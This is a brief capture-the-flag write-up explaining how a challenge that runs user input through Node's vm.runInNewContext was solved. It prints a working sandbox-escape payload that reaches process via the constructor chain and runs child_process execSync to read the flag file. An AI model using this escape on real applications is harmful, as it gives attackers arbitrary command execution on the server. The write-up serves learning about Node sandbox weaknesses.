# CaSSiNo
By observing the source code, we can see that we can input any javascript code in prompt to run it in VM (nodejs module). 
# The Source Code
The main function call in this programm is 
```javascript
const result = vm.runInNewContext(input)
```
This means that whatever input we give the binary, it will run it in a new context, of course, without any filters.
# The Solution
I'm not too familiar with nodejs nor node vm modules so I searched up `node vm security` and I found an article on [Pwnisher Blog](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html) called `Sandboxing NodeJS is hard, here is why` . It basically is set up almost identical to this challenge. By modifing the payload a bit I got:
```javascript

const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
```
Since we know the flag location from the hint, we can just put that in.
```
==> flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```